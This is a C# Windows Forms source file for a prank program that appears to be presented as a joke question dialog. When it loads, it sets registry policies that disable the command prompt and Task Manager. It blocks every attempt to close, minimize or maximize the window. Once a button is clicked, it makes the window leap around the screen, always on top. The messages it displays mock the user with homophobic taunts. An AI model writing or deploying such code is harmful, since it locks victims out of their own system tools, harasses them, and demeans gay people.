﻿using Microsoft.Win32;
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace ChesterQuestion
{
    public partial class Form1 : Form
    {
        private const int GWL_EXSTYLE = -20;
        private const int WS_EX_TOOLWINDOW = 0x00000080;
        private const int WM_SYSCOMMAND = 0x0112;
        private const int SC_CLOSE = 0xF060;
        private const int SC_MINIMIZE = 0xF020;
        private const int SC_MAXIMIZE = 0xF030;
        private const int SW_SHOW = 5;
        private Timer moveTimer;
        private Random random;

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowLong(IntPtr hWnd, int nIndex);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern bool SetForegroundWindow(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

        private const uint SWP_NOSIZE = 0x0001;
        private const uint SWP_NOACTIVATE = 0x0010;
        private static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);

        public Form1()
        {
            InitializeComponent();
            this.FormBorderStyle = FormBorderStyle.FixedDialog; // Prevent resizing
            this.MaximizeBox = false; // Disable maximize button
            this.MinimizeBox = false; // Disable minimize button
            this.ControlBox = false; // Hide the X, minimize, and maximize buttons
            this.ShowInTaskbar = true; // Ensure it is shown in the taskbar
            this.Icon = null; // Remove the icon from the form

            random = new Random();
            InitializeTimer();

            // Hide the form's icon
            HideWindowIcon();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            DisableCMD();
            DisableTaskManager();
        }

        private void DisableCMD()
        {
            try
            {
                RegistryKey cmdKey = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System");
                if (cmdKey != null)
                {
                    cmdKey.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
                    cmdKey.Close();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error disabling CMD: " + ex.Message);
            }
        }

        private void DisableTaskManager()
        {
            try
            {
                RegistryKey taskManagerKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                if (taskManagerKey != null)
                {
                    taskManagerKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                    taskManagerKey.Close();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error disabling Task Manager: " + ex.Message);
            }
        }

        private void HideWindowIcon()
        {
            int exStyle = GetWindowLong(this.Handle, GWL_EXSTYLE);
            SetWindowLong(this.Handle, GWL_EXSTYLE, exStyle | WS_EX_TOOLWINDOW);
            ShowWindow(this.Handle, SW_SHOW);
        }

        private void InitializeTimer()
        {
            moveTimer = new Timer();
            moveTimer.Interval = 100; // Move every 100 milliseconds
            moveTimer.Tick += MoveFormAroundDesktop;
        }

        private void MoveFormAroundDesktop(object sender, EventArgs e)
        {
            int x = random.Next(0, Screen.PrimaryScreen.WorkingArea.Width - this.Width);
            int y = random.Next(0, Screen.PrimaryScreen.WorkingArea.Height - this.Height);
            SetWindowPos(this.Handle, HWND_TOPMOST, x, y, this.Width, this.Height, SWP_NOSIZE | SWP_NOACTIVATE);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            // Update the label text
            label1.Text = "LMAO YOU ARE GAY!!!";

            // Hide buttons
            button1.Visible = false;
            button2.Visible = false;

            // Show the message box
            MessageBox.Show("That's so funny that you are gay!");

            // Start moving the form
            moveTimer.Start();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            // Show the message box
            var result = MessageBox.Show("I think you are gay.", "", MessageBoxButtons.OK);

            // After OK is pressed, update the form's state
            if (result == DialogResult.OK)
            {
                // Update the label text
                label1.Text = "CAP! YOU ARE GAY!";

                // Hide buttons
                button1.Visible = false;
                button2.Visible = false;

                // Start moving the form
                moveTimer.Start();
            }
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == WM_SYSCOMMAND)
            {
                int command = m.WParam.ToInt32() & 0xfff0;
                if (command == SC_CLOSE)
                {
                    // Show message box if ALT + F4 is pressed
                    MessageBox.Show("You can't close it! XD!");
                    return; // Prevent closing
                }
                else if (command == SC_MINIMIZE || command == SC_MAXIMIZE)
                {
                    return; // Prevent minimizing and maximizing
                }
            }
            base.WndProc(ref m);
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true; // Cancel the close event
        }
    }
}